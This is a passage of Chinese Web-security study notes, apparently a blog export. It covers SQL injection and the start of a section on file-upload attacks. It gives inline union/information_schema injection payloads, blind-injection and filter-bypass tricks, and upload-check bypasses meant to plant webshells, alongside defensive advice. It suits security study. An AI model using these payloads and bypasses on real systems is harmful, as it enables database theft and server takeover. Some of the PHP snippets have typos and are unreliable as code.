<li><strong>页面没有变化</strong>：访问三个链接，显示的页面没有任何不同。这种情况说明后台针对此查询点的过滤比较严格，是否存在 SQL 注人漏洞还需进行后续测试。</li>
<li><strong>页面中少了部分内容</strong>：如访问前两个链接正常，第三个页面里有明显的内容缺失，则基本可以确定有漏洞存在。接下来就需要检测是否有<mark class="label warning">union显示位</mark>，如果没有，也可尝试进行<code>bool</code>注人（详情参见后续关于盲注的介绍）。</li>
<li><strong>错误回显</strong>：如果访问第三个链接后出现数据库报错信息，那么可以判定当前查询点存在注人，用标准的回显注人法即可实现 SQL 注人攻击。</li>
<li><strong>跳转到默认界面</strong>：如果第一个链接显示正常，第二、第三个链接直接跳转到首页或其他默认页面，那么这可能是后台有验证逻辑，或者是有在线防护系统或防护软件提供实时保护。之后可尝试绕过防护工具的思路（大小写混用、编码等）。</li>
<li><strong>直接关闭连接</strong>：如果在访问上述第二、三个链接时出现访问失败，那么这种情况下可尝试利用 Burpsuite 抓取服务器响应包，观察包头 server 字段内容。根据经验，这种情况通常为防护类工具直接开启在线阻断导致，后续可利用编码、换行等方式尝试绕过（极难成功）。</li>
</ul>
<h4 id="1-3-2-通过回显位确定字段数"><a href="#1-3-2-通过回显位确定字段数" class="headerlink" title="1.3.2 通过回显位确定字段数"></a>1.3.2 通过回显位确定字段数</h4><p>回显位指的是数据库查询结果在前端界面中显示出来的位置，也就是查询结果返回的是数据库中的<mark class="label info">哪列</mark>。在 SQL 注人中，一般利用<mark class="label success">order by</mark>、<mark class="label danger">union select</mark>等命令获取回显位的信息来猜测表内容，前者用来判断数据表的列数（字段数），后者用来判断回显位（字段）。具体使用方法如下:</p>
<p><code>XX.php?id =1&#39; order by 4#</code></p>
<p>使用<code>order by</code>的主要目的是判断当前数据表的列数。在测试过程中可修改对应的数值。如果输人的数值大于当前数据表的列数，则查询语句执行失败，由于页面有报错信息，则可以由此判断该数据表的列数</p>
<p><code>XX.php?id =1&#39; and &#39;1&#39;=&#39;2&#39; union select 1,2,3#</code></p>
<p>使用<code>union select</code>来判断回显位，当得到回显位确定是哪一列或哪些列之后，则可以构造语句来获取数据表的内容。</p>
<div class="note info"><p><code>union select</code>中经常会用到<code>NULL</code>起到占位的作用，从而避免显示结果干扰判断。</p>
</div>

<h4 id="1-3-3-注入并获取数据"><a href="#1-3-3-注入并获取数据" class="headerlink" title="1.3.3 注入并获取数据"></a>1.3.3 注入并获取数据</h4><p>尝试获取表、字段、数据的信息。</p>
<p>在 MySQL 5.0 之后的版本中，数据库内置了一个库<mark class="label warning">information_ schema</mark>，用于存储当前数据库中的所有库名、表名等信息。因此，可利用 SQL 注人方式，通过远程注入查询语句方式实现直接读取 MySQL 数据库中的<code>information_ schema</code>库的信息，从而获取感兴趣的信息。SQL 注入在<code>information_ schema</code>库中主要涉及内容可参考下图。</p>
<p><img data-src="https://i.loli.net/2020/12/22/Q2MZpR7gwm3TFc5.png" alt="information_ schema"></p>
<p>在 SQL 注入过程中，可直接查询<code>information_ schema</code>库来获得目标信息。这里要注意的是，如果需要对表名进行爆破，那么<mark class="label danger">表名需为十六进制格式</mark>。</p>
<p>基本注入语句可参考以下格式（回显位是4）：</p>
<ul>
<li><code>union select 1,2,3,table_name,from(select * from information_schema.tables where table_schema=hex(数据库名) order by 1 limit 0,1)</code></li>
<li><code>union select 1,2,column_name,from(select* from information_schema.columns where table_name=hex(表名) and table_schema=hex(数据库) limit 0,1)</code></li>
<li><code>union select 1,2,字段 from 表名 limit 0,1</code></li>
</ul>
<h3 id="1-4-盲注"><a href="#1-4-盲注" class="headerlink" title="1.4 盲注"></a>1.4 盲注</h3><p>相对于普通注人来说，盲注的难点在于<strong>前台没有回显位</strong>，导致无法直接获取到有效信息。只能对注人语句执行的正确与否进行判断，也就是只有<mark class="label success">true 和 false</mark>的区别，因此盲注攻击的难度较大。在实施盲注时，关键在于合理地实现对目标数据的猜测，并利用<mark class="label warning">时间延迟</mark>等手段实现猜测正确与否的证明。</p>
<p>常使用的函数有：</p>
<ul>
<li>leng()：获取数据库、表、字段长度等。</li>
<li>information_schema()：获取数据库信息。</li>
<li>定向获取字符<ul>
<li>mid()：获取字符串的值。</li>
<li>substring()：获取字符串的值。</li>
</ul>
</li>
<li>时间延迟<ul>
<li>benchmark(count,expr)：重复计算<code>expr</code>表达式<code>count</code>次来达到延时作用，但是内存消耗很大，会导致系统无响应。</li>
<li>sleep(n)：暂停数据库 n 秒</li>
</ul>
</li>
</ul>
<div class="note default"><p><code>mid()</code>和<code>substr()</code>都是<code>substring</code>的同义词。语法是：<code>mid(str,pos,len)</code>，<code>str </code>是字符串，<code>pos</code>是起始子字符串的位置（第一个字母为<code>1</code>），<code>len</code>是一个可选参数，它决定从起始位置返回的字符个数。例：</p>
<p><code>SELECT MID(&#39;I drink coffee&#39;, 3, 5) Result;</code>    结果为：<code>drink</code></p>
</div>

<p>【<a href="https://www.php.cn/mysql-tutorials-416587.html#:~:text=%E5%9C%A8MySQL%E4%B8%AD%EF%BC%8CMID%28%29%E5%87%BD%E6%95%B0%E8%BF%94%E5%9B%9E%E4%BB%8E%E6%8C%87%E5%AE%9A%E4%BD%8D%E7%BD%AE%E5%BC%80%E5%A7%8B%E7%9A%84%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%82MID%28%29%E5%92%8CSUBSTR%28%29%E9%83%BD%E6%98%AFSUBSTRING%28%29%E7%9A%84%E5%90%8C%E4%B9%89%E8%AF%8D%E3%80%82%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%3A,MID%28str%2Cpos%2Clen%29%20%E8%BF%99%E9%87%8C%EF%BC%8Cstr%E6%98%AF%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8Cpos%E6%98%AF%E8%B5%B7%E5%A7%8B%E5%AD%90%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%9A%84%E4%BD%8D%E7%BD%AE%EF%BC%8Clen%E6%98%AF%E4%B8%80%E4%B8%AA%E5%8F%AF%E9%80%89%E5%8F%82%E6%95%B0%EF%BC%8C%E5%AE%83%E5%86%B3%E5%AE%9A%E4%BB%8E%E8%B5%B7%E5%A7%8B%E4%BD%8D%E7%BD%AE%E8%BF%94%E5%9B%9E%E7%9A%84%E5%AD%97%E7%AC%A6%E6%95%B0%E3%80%82">MySQL MID()函数的用法详解（代码示例）</a>】</p>
<p>【<a href="https://www.yiibai.com/mysql/substring.html">MySQL substring()函数</a>】</p>
<p>【<a href="https://www.cnblogs.com/duanxz/p/3936759.html">MYSQL BENCHMARK()函数</a>】</p>
<p>【<a href="https://cloud.tencent.com/developer/news/371274">Myql SLEEP函数和SQL注入</a>】</p>
<h3 id="1-5-常见防护手段及绕过方法"><a href="#1-5-常见防护手段及绕过方法" class="headerlink" title="1.5 常见防护手段及绕过方法"></a>1.5 常见防护手段及绕过方法</h3><div class="note danger"><p>SQL 注人的防护方法包括：</p>
<ul>
<li><mark class="label success">参数过滤</mark> </li>
<li><mark class="label danger">预编译处理</mark></li>
</ul>
</div>

<p><strong>参数过滤分为</strong>：</p>
<ul>
<li>数据类型限制（类型和长度）</li>
<li>危险字符处理</li>
</ul>
<p>通俗地说就是：要么严防死守，细致检查；要么严格限定参数的有效范围（<strong>参数化查询</strong>）。总之就是要尽可能限制用户可提交参数的类型。</p>
<p>针对 SQL 注入设计防护体系时，一定要与真实的业务场景进行配合，很多时候用简单的方式可获得非常好的防护效果。首先需尽可能详细地限制允许用户输人的参数类型及长度；其次，需考虑用户输人内容的特点及目的，开展有针对性的关键字、词过滤;如果是新建系统，推荐利用参数化查询手段，以实现更好的防护效果。当然，在这期间，应尽可能保证中间件版本的更新频率，可有效防护各类型攻击。以下将针对每种防护场景进行探讨。再次强调，防护力较弱的方法并不一定不适用，必须与实际环境相结合来选择。</p>
<h4 id="1-5-1-参数类型检测及绕过"><a href="#1-5-1-参数类型检测及绕过" class="headerlink" title="1.5.1 参数类型检测及绕过"></a>1.5.1 参数类型检测及绕过</h4><p>如链接：<code>xxxx.php?type_id=4&amp;new_id=690</code>，其中<code>type_id=4</code>和<code>new_id=690</code>为数字类型且长度均为一定值，均为用户可控，避免参数中出现非数字类型字符，并且对长度进行限制。或使用<strong>正则表达式</strong>可有效避免 SQL 注入。</p>
<div class="note success"><p><strong>防护方法</strong>：</p>
<ul>
<li><mark class="label info">使用函数对参数类型进行过滤</mark></li>
<li><mark class="label warning">正则表达式</mark></li>
</ul>
</div>

<p>参数类型检测主要<strong>面向字符型</strong>的参数查询功能，可以用以下函数实现：</p>
<ul>
<li><code>int intval ( mixed $var [, int $base = 10 ] )</code> ：通过使用指定的进制 base 转换（默认是十进制），返回变量<code>var</code>的<code>integer</code> 数值。</li>
<li><code>bool is_numeric ( mixed $var ) </code>：检测变量是否为数字或数字字符串，<strong>但此函数允许输人为负数和小数</strong>。</li>
<li><code>ctype_digit</code>： 检测字符串中的字符是否都是数字，<strong>负数和小数无法通过检测</strong>。</li>
</ul>
<p>在特定情况下，使用这三个函数可限制用户输人数字型参数，这在一些仅允许用户参数为数字的情况下非常适用，如查询 ID 号、学号、电话号码等业务场景。</p>
<p><strong>绕过方法</strong>：</p>
<p>当 Web 应用对数据进行数字类型的限制时，受制于字符类型要求，因此无法构造出有效的语句，也就无法利用 SQL 注人攻击来获取数据库内的信息。</p>
<p>但能使用某些技巧令数据库报错，如<code>is_numeric</code>支持<mark class="label primary">十六进制与十进制</mark>，提交<code>0x01</code>时它也会进行查询；<code> intval</code>虽然默认<strong>只支持十进制数字</strong>，但依然会有问题，比如提交<code>id=-1</code>时会出错。这些细微的差异可以帮助攻击者识别后台的过滤函数。</p>
<p>将字符串<code>&#39;1 or 1&#39;</code>转换为十六进制为<code>0x2731206f72203127</code>则可以进行绕过。</p>
<div class="note success"><p><strong><code>==</code>绕过</strong></p>
<p> PHP中有两种比较符号：</p>
<ul>
<li><code>===</code>：会同时比较字符串的值和类型</li>
<li><code> ==</code>： 会先将字符串换成相同类型，再作比较，属于弱类型比较</li>
</ul>
<p><code> ==</code>对于所有<code>0e</code>开头的比较都判为相等，<code> is_numeric()</code> 判断变量是否为<mark class="label danger">数字或数字字符串</mark>， <code>is_numeric()</code>函数会判断如果是数字和数字字符串则返回 TRUE，否则返回 FALSE，且 PHP 中弱类型比较时，会使<code>&#39;1234a&#39; == 1234</code>为真，或者<code>&#39;12345%00&#39;</code>，该函数还可能造成 SQL 注入，例如将<code>‘1 or 1&#39;</code>转换为16进制形式，再传参，就可以造成 SQL 注入。</p>
</div>

<h4 id="1-5-2-参数长度检测及绕过"><a href="#1-5-2-参数长度检测及绕过" class="headerlink" title="1.5.2 参数长度检测及绕过"></a>1.5.2 参数长度检测及绕过</h4><p><strong>防护思路</strong>：</p>
<p>当攻击者构造 SQL 语句进行注入攻击时，其 SQL 注入语句一般会有一定长度， 并且成功执行的 SQL 注入语句的字符数量通常会非常多，远大于正常业务中有效参数的长度。</p>
<p>因此，如果某处提交的内容具有固定的长度（如密码、用户名、邮箱、手机号等），那么严格控制这些提交点的字符长度，大部分注入语句就没办法成功执行。</p>
<p>PHP 下可以使用函数<code>strlen</code>来统计出入参数的长度，然后可使用代码对长度进行限制。</p>
<p><strong>绕过方法</strong>：</p>
<p>可使用注释符、and、or 等修改原有语句意图。</p>
<p>如使用注释符：<code>SELECT COUNT(*) FROM Login WHERE UserName=&#39;test&#39;--&#39; AND Password=&#39;(1)&#39;&quot;;</code></p>
<p>由于注释符的存在，此语句实际执行的内容则变为：<code>SELECT COUNT(*) FROM Login WHERE UserName=&#39;test&#39; ;</code>，只要有<code>test</code>用户存在，数据库就返回正确。</p>
<h4 id="1-5-3-危险参数过滤及绕过"><a href="#1-5-3-危险参数过滤及绕过" class="headerlink" title="1.5.3 危险参数过滤及绕过"></a>1.5.3 危险参数过滤及绕过</h4><p><strong>防护方法</strong>：</p>
<p>常见的危险参数过滤方法包括<strong>关键字</strong>、<strong>内置函数</strong>、<strong>敏感字符</strong>的过滤，其过滤方法主要有如下三种：</p>
<div class="note default"><ul>
<li><p><mark class="label info">黑名单过滤</mark></p>
<p>将一些可能用于注人的敏感字符写人黑名单中，如<code>&#39;</code> （单引号）、<code>union</code>、<code>select</code>等，也可能使用正则表达式做过滤，但黑名单可能会有疏漏。</p>
</li>
<li><p><mark class="label warning">白名单过滤</mark></p>
<p>例如，用数据库中的已知值校对，通常对参数结果进行合法性校验，符合白名单的数据方可显示。</p>
</li>
<li><p><mark class="label success">参数转义</mark></p>
<p>对变量默认进行adsalashes (在预定义字符前添加反斜杠)，使得SOL注人语句构造失败。</p>
</li>
<li><p>GPC 过滤</p>
<p>GPC 是GET、POST、COOKIE 三种数据接收方式的合称。在 PHP 中，如果利用<code>$_REQUEST</code>接受用户参数，那么这三种方式均可被接收。在早期PHP中，GPC过滤是内置的一种安全过滤函数，若用户提交的参数中存在敏感字符单引号<code>&#39;</code>、双引号<code>&quot;</code>、反斜 线<code>\</code>与<code>NUL</code> （<code>NULL</code>字符），就在其前端<mark class="label primary">添加反斜杠</mark>。</p>
</li>
</ul>
<p>由于白名单方式要求输出参数有着非常明显的特点，因此适用的业务场景非常有限。总体来说，防护手段仍建议以<mark class="label danger">黑名单+参数转义</mark>方式为主，这也是目前针对 SQL 敏感参数处理的主要方式。</p>
</div>

<p><strong>绕过方法</strong>：    </p>
<p>利用参数变化绕过黑名单防护，白名单没有很好的方法绕过，利用<strong>宽字节注入</strong>绕过 GPC 过滤。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#123;% tabs 参数绕过方法 %&#125;</span><br><span class="line">&lt;!-- tab 黑名单 --&gt;</span><br><span class="line"></span><br><span class="line">黑名单过滤一般试图阻止 **SQL 关键字**、特定的单个字符或空白符，那么绕过黑名单防护措施的核心思路就是：将关键字或特定符号进行不同形式的变换，从而实现绕过过滤器的目的。针对黑名单，目前存在的绕过方式有以下几种。</span><br><span class="line"></span><br><span class="line">- 使用大小写变种</span><br><span class="line"></span><br><span class="line">- 使用SQL注释代替空格（假设后台已经过滤空格，数据库会自动忽略注释符，执行时将其变成空格。</span><br><span class="line"></span><br><span class="line">- 嵌套过滤</span><br><span class="line"></span><br><span class="line">  在过滤器阻止的字符前面增加一个采用 URL 编码的空字节`%<span class="number">00</span>`。嵌套过滤后的表达式如`selecselectt`。过滤之后的部分就可重新结合成`select`。</span><br><span class="line"></span><br><span class="line">- `+`号拆分字符（`<span class="keyword">or</span>`等价于`<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;r&#x27;</span>`）</span><br><span class="line"></span><br><span class="line">- 利用系统注释符截断（`--`可对后续语句进行截断）</span><br><span class="line"></span><br><span class="line">- 替换字符</span><br><span class="line"></span><br><span class="line">  - 用`like`替代`=`，可以绕过对`=`的过滤。</span><br><span class="line">  - 用`in`替代`=`，可以绕过对`=`的过滤。</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab GPC 过滤 --&gt;</span><br><span class="line"></span><br><span class="line">GPC 过滤是**PHP在5.4版本之前**存在的一种防护机制，其特点是在特殊字符前面加斜线`\`，如单引号`&#x27;`会形成`\&#x27;`的效果，导致原有的功能失效。因此，针对 GPC 过滤的情况，要对 GPC 添加的`\`进行转义。这种情况下可尝试&#123;% label default @宽字节注人 %&#125;方法。</span><br><span class="line"></span><br><span class="line">&#123;% note danger %&#125;</span><br><span class="line"></span><br><span class="line">宽字节带来的安全问题主要是编码转换引起的“吃 ASII 字符”（一字节）的现象，如果合理拼接，可让吃掉一字节后的剩余内容重新拼接成一个单引号`&#x27;`	(举例)。</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">下面来分析 MySQL 的字符集转换过程。MySQL 收到请求时将请求数据从`charaeter_set_client`转换为`character_set_connection`。进行内部操作前将请求数据从`character_set_connection`转换为内部操作字符集，其确定方法如下：</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 使用每个数据字段的`CHARACTER SET`设定值。</span><br><span class="line"><span class="number">2.</span> 若上述值不存在，则使用对应数据表的`DEFAULT CHARACTER SET`设定值（MySQL 扩展，非 SQL 标准)。</span><br><span class="line"><span class="number">3.</span> 若上述值不存在，则使用对应数据库的`DEFAULT CHARACTER SET`设定值。 </span><br><span class="line"><span class="number">4.</span> 若上述值不存在，则使用`character <span class="built_in">set</span> server`设定值。</span><br><span class="line"></span><br><span class="line">最终将操作结果从内部操作字符集转换为`character_set_results`。</span><br><span class="line"></span><br><span class="line">&#123;% note warning %&#125;</span><br><span class="line"></span><br><span class="line">宽字节注人发生的原因就是 PHP 发送请求到 MySQL 时字符集使用`character_set_client`设置值进行了一次编码，如果编码为 GB2312、GBK、GB18030、 BIG5、Shift_ JIS 等双字节编码，就会存在宽字节注人漏洞。</span><br><span class="line"></span><br><span class="line">&#123;% endnote %&#125;</span><br><span class="line"></span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 白名单 --&gt;</span><br><span class="line">白名单防护严格限制输出内容，因此没有很好的绕过手段。</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure>



<h4 id="1-5-4-针对过滤的绕过方式汇总"><a href="#1-5-4-针对过滤的绕过方式汇总" class="headerlink" title="1.5.4 针对过滤的绕过方式汇总"></a>1.5.4 针对过滤的绕过方式汇总</h4><p><strong>（1）尖括号（大于小于）过滤绕过方式</strong></p>
<p>用于替代大于<code>&gt;</code>或小于<code>&lt;</code>符号或等号<code>=</code>主要使用函数：<code>between</code>、<code>greatest</code>。</p>
<p><code>between mix and max</code>：</p>
<ul>
<li>可利用<code>between 114 and 114</code>来替代<code>=114</code>，也就是字符<code>r</code></li>
<li>可利用<code>between 113 and 115</code>来替代<code>&gt;113 and &lt;115</code></li>
</ul>
<p><code>greatest(a,b)</code>：</p>
<ul>
<li><code>greatest(ascii(mid(user(),1,1)),140)&gt;=140</code>，判断<code>user()</code>第一个字符的<code>ASCII</code>。</li>
</ul>
<h4 id="1-5-5-预编译后参数化查询"><a href="#1-5-5-预编译后参数化查询" class="headerlink" title="1.5.5 预编译后参数化查询"></a>1.5.5 预编译后参数化查询</h4><p>【<a href="https://directoree.top/post/sqlinject/">数据库编译原理和注入</a>】</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Web 安全防护指南基础篇-文件上传</title>
    <url>/post/web-basic-safety-guide-uploadfile/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ (๑˃̵ᴗ˂̵) ପ( ˘ᵕ˘ ) ੭ </p>
<span id="more"></span>



<h2 id="1-文件上传"><a href="#1-文件上传" class="headerlink" title="1 文件上传"></a>1 文件上传</h2><h3 id="1-1-上传攻击原理"><a href="#1-1-上传攻击原理" class="headerlink" title="1.1 上传攻击原理"></a>1.1 上传攻击原理</h3><p>上传功能是用户与服务器进行文件交互的重要手段，攻击者的<strong>目标</strong>是取得当前 Web 服务器的<strong>权限</strong>。若通过 Web 层面开展攻击，必须将攻击者的木马插入 Web 系统中，并在服务器端执行。这就是文件注入攻击。</p>
<ol>
<li><strong>攻击原理</strong>：<mark class="label danger">文件上传攻击</mark>攻击者利用 Web 应用对文件上传过滤不严的漏洞，将应用程序定义范围之外的文件上传到 Web 服务器，并且此类文件通常是木马，在上传成功后攻击者即可获得当前的 webshell。</li>
<li><strong>上传原理</strong>：<mark class="label success">文件上传原理</mark>攻击者想要获取webshell，最直接的方法就是将 Web 木马插入到服务器进行成功解析。那么如何理解成功解析？假设目标服务器为用<code>PHP</code>语言构建的 Web 系统，那么针对上传点就需要利用<code>PHP</code>木马，并且要求木马在服务器以后缀名为<code>.php</code>进行保存。因此，<strong>上传木马的过程就是在 Web 系统中新增一个页面</strong>。 当木马上传成功后，攻击者就可远程访问这个木马文件，也就相当于浏览一个页面，只不过这个页面就是木马，具备读取、修改文件内容、连接数据库等功能。</li>
<li><strong>漏洞原因</strong>：<mark class="label warning">上传漏洞存在前提</mark>存在上传点且在上传点用户可独立控制上传内容，同时上传文件可被顺利解析。</li>
</ol>
<p>攻击端上传木马（<code>.php</code>）--&gt; 服务器，攻击端访问木马所在目录 --&gt; 服务器（成功解析并执行）</p>
<p><img data-src="https://i.loli.net/2020/12/17/vQnrx7zPtM9gsVi.png" alt="上传攻击防护思路"></p>
<h3 id="1-2-上传攻击条件"><a href="#1-2-上传攻击条件" class="headerlink" title="1.2 上传攻击条件"></a>1.2 上传攻击条件</h3><div class="note primary"><ol>
<li>目标网站具有<strong>上传功能</strong></li>
<li>上传的目标文件（木马）能够被 Web 服务器<strong>解析执行</strong></li>
<li>知道文件上传到服务器后的<strong>存放路径和文件名称</strong></li>
<li>目标文件可被用户访问</li>
</ol>
</div>

<p>以上四个条件为文件上传攻击的必要条件，对于攻击者来说缺一不可，对于防护这来说必须至少解决其中一条。</p>
<h3 id="1-3-上传检测绕过技术"><a href="#1-3-上传检测绕过技术" class="headerlink" title="1.3 上传检测绕过技术"></a>1.3 上传检测绕过技术</h3><p>基于客户端参数的检测手段：JS 防护、MIME 防护。 </p>
<h4 id="1-3-1-客户端-Javascript-检测及绕过"><a href="#1-3-1-客户端-Javascript-检测及绕过" class="headerlink" title="1.3.1 客户端 Javascript 检测及绕过"></a>1.3.1 客户端 Javascript 检测及绕过</h4><span id="Javascript">

<p><strong>防护方法</strong>：客户端 Javascript 检测是在表单上传到服务器前进行的检测， 检测<mark class="label success">文件名后缀</mark>，允许的后缀名放行通过，使用<mark class="label primary">白名单</mark>方式。</p>
</span>

<p><strong>绕过方法</strong>：</p>
<div class="note danger"><ul>
<li>浏览器禁用 JS 运行</li>
<li>抓包软件抓包更改后缀名（JS 防护手段的 JS 脚本是在 HTTP 数据包发出之前执行完毕的）</li>
</ul>
</div>

<h4 id="1-3-2-服务器端-MIME-检测及绕过"><a href="#1-3-2-服务器端-MIME-检测及绕过" class="headerlink" title="1.3.2 服务器端 MIME 检测及绕过"></a>1.3.2 服务器端 MIME 检测及绕过</h4><p>在 HTTP 协议中，会利用<code>Content-Type</code>标识本次上传的内容类型。这个类型由<strong>客户端的浏览器</strong>根据本次上传文件的<strong>后缀名</strong>自动生成，这里检测到的<code>Content-Type</code>是在<code>body</code>里。</p>
<p>客户端上传文件时会自动检测上传的文件类型，检测的依据是<mark class="label warning">文件后缀</mark>，检测的方法是通过检查 HTTP 包的<code>Content-Type</code>字段中的值来实现的。将<code>php</code>文件的后缀改成<code>png</code>，MIME 检测类型判断后缀为<code>imae/png</code>。</p>
<p>常见的类型如下：</p>
<table>
<thead>
<tr>
<th align="center">Content-Type</th>
<th align="center">含义</th>
<th align="center">Content-Type</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Image&#x2F;jpg</td>
<td align="center">JPG 图像</td>
<td align="center">Text&#x2F;html</td>
<td align="center">HTML 文档</td>
</tr>
<tr>
<td align="center">Image&#x2F;gif</td>
<td align="center">GIF 图像</td>
<td align="center">application&#x2F;XML</td>
<td align="center">XML 文档</td>
</tr>
<tr>
<td align="center">Image&#x2F;png</td>
<td align="center">PNG 图像</td>
<td align="center">application&#x2F;PDF</td>
<td align="center">PDF 文档</td>
</tr>
</tbody></table>
<p><strong>防护方法</strong>：通过在客户端浏览器检测<code>Content-Type</code>，使用白名单的方式放行通过。类似于<a href="#Javascript">客户端 Javascript 检测</a>防护方法。</p>
<p><strong>绕过方式</strong>：由于<code>Content-Type</code>类型是由客户端浏览器自动生成的，那么在这个过程中<code>Content-Type</code>的值是可控的（因为在客户端生成），只需要 HTTP 抓包后修改<code>Content-Type</code>即可绕过。</p>
<h4 id="1-3-3-服务器端文件扩展名检测及绕过"><a href="#1-3-3-服务器端文件扩展名检测及绕过" class="headerlink" title="1.3.3 服务器端文件扩展名检测及绕过"></a>1.3.3 服务器端文件扩展名检测及绕过</h4><p><strong>防护思路</strong>：</p>
<ol>
<li>基于客户端参数的检测手段可以在文件上传到服务器前对 HTTP 报文拦截进行修改，当服务器就收到上传的信息后，校验文件名是否合法，采用黑&#x2F;白名单方式。</li>
<li>完全不信赖用户所上传文件的后缀名，在用户上传文件到服务器之后，<strong>重新给上传文件添加后缀名</strong>。</li>
</ol>
<p><strong>防护方法</strong>：</p>
<ul>
<li><mark class="label info">文件后缀重命名</mark></li>
<li><mark class="label warning">白名单过滤</mark></li>
<li><mark class="label primary">黑名单过滤</mark></li>
</ul>
<p>对于文件上传在服务器端文件重命名（重命名<strong>文件名和文件后缀</strong>）时，能够针对后缀名的各种绕过。通常会使用一个随机数生成函数来生成文件名，可以防止<code>%00</code>截断和解析漏洞。由于该方法适用场景单一，目前基本上无有效手段进行绕过。</p>
<p>文件重命名防护代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filerename</span> =<span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line"><span class="variable">$newfile</span> = md5 (uniqid (microtime(<span class="number">7</span>)).<span class="string">&#x27;_&#x27;</span>.<span class="variable">$flerename</span>;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_fle(<span class="variable">$_</span> FILES[<span class="string">&#x27;upfile&#x27;</span>]l<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$distination</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfile</span>))</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<p><strong>绕过思路</strong>：黑白名单机制归根结底为限制用户的上传文件后缀名，避免可解析成 Web 的后缀名出现。可尝试使用未被过滤的文件后缀、解析漏洞等构造非限制条件进行绕过。</p>
<p><strong>绕过方法</strong>：</p>
<div class="note info"><p>针对黑名单：</p>
<ol>
<li><p>多重测试过过滤文件名</p>
<p>如针对<code>.php</code>的文件禁止上传，但没有对其他格式做出限制，可构造<code>php4</code>、<code>php5</code>、<code>cer</code>等后缀，同时中间件仍旧按照<code>.php</code>等进行解析。</p>
</li>
<li><p>后缀名大小写绕过</p>
</li>
<li><p>后缀名包含绕过</p>
<p>假如禁用<code>.php</code>后缀名，可构造<code>.pphphp</code>进行绕过。</p>
</li>
<li><p>特殊文件名构造（Windows 下）</p>
<p>由于黑名单方式是先对文件后缀进行校验，然后再将临时文件转存到真实路径下。该绕过方式是在文件后缀名验证通过后，在临时文件转存之前进行绕过。</p>
<p>代理抓上传的包将文件后缀名构造为<code>.php.</code>或<code>.php_</code>，文件上传到服务器后首先进行黑名单后缀名验证，验证通过后进行文件转存时，由于 Windows不识别这些后缀名，回自动去掉<code>.</code>和<code>_</code>等特殊符号，从而绕过黑名单防护。</p>
</li>
<li><p><code>%00</code>截断</p>
<p>此绕过方式利用的是 C 语言的<mark class="label warning">终止符</mark>特性，当 C 语言在执行过程中遇到<code>%00</code>，<code>%00</code>会被当成终止符，<strong>因此程序会自动截断后续信息</strong>，仅保留<code>%00</code>之前的内容。此漏洞仅存在于<code>PHP 5.3.7</code>之前的版本，如<code>shell.php .jp</code>g （注意，<code>jpg</code> 前有一个空格）。在上传页面进行转存时，之前文件名中的空格会被当成终止符，导致空格之后的内容被忽略。因此，最终文件名会变为<code>shell.php</code>，从而绕过了文件后缀名检查。</p>
</li>
</ol>
</div>

<div class="note success"><p>针对白名单：</p>
<p>相对于黑名单防护手段，白名单限制更为严格，非允许的后缀名一律拒绝上传，所以在黑名单中常用的修改大小写绕过手段、多类型后缀名绕过手段等，由于都无法满足白名单的过滤规则，因此都会被过滤。只有如下两种方式可以绕过防护机制：</p>
<ul>
<li>特殊文件名构造（参考黑名单防护）</li>
<li><code>0x00</code>截断（参考黑名单防护）</li>
</ul>
</div>

<h4 id="1-3-4-服务器端文件内容检测及绕过"><a href="#1-3-4-服务器端文件内容检测及绕过" class="headerlink" title="1.3.4 服务器端文件内容检测及绕过"></a>1.3.4 服务器端文件内容检测及绕过</h4><p><strong>防护思路</strong>：</p>
<div class="note primary"><p>针对图像文件，对文件内容的检测主要有以下三种方法。</p>
<ol>
<li>通过检测上传文件的<strong>文件头</strong>来判断当前文件格式。</li>
<li>调用 API 或函数对文件进行加载测试，常见的是图像二次渲染。</li>
<li>检测上传文件是否为图像文件内容。</li>
</ol>
</div>

<p>在上传漏洞的防护过程中，在文件上传时检测内容是一项非常有效的防护措施。防护手段可包含检测文件的文件头及内容图像格式是否合法（参考第一、三种防护方法），或者在显示过程中调用函数进行二次渲染，<mark class="label danger">导致木马等非图像代码由于无法渲染成像素而被丢弃</mark>，从而达到防护的效果（参考第二种防护方法）。但需注意的是，针对图像二次渲染会给服务器带来额外的性能开销。因此需要根据业务防护需求来寻找性能开销与安全要求之间的平衡点。</p>
<p><strong>防护代码</strong>：</p>
<p>（1）文件头判断</p>
<p>读取文件<strong>开头部分的数个字节</strong>，判断文件头与文件类型是否匹配。通常情况下，通过判断前<mark class="label success">10个字节</mark>基本上就能判断出一个文件的真实类型。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTypeList</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;FFD8FFE0&quot;</span>, <span class="string">&quot;jpg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;89504E47&quot;</span>, <span class="string">&quot;png&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;47494638&quot;</span>，<span 